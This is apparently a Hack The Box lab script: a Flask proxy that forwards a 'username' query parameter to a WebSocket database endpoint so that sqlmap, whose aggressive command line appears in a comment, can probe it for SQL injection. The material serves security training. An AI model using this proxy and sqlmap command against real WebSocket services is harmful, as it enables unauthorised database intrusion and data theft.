# websocket-client
# flask
# $ sqlmap -u http://127.0.0.1:8000/?username=htb-stdnt -p username --risk=3 --level=5 --batch --thread=10

from flask import Flask, request
from websocket import create_connection
import json

app = Flask(__name__)

WS_URL = 'ws://172.17.0.2/dbconnector'

@app.route('/')
def index():
    req = {}
    req['username'] = request.args.get('username', '')

    ws = create_connection(WS_URL)
    ws.send(json.dumps(req))
    r = json.loads(ws.recv())
    ws.close()

    if r.get('error'):
        return r['error']

    return r['messages']

app.run(host='127.0.0.1', port=8000)

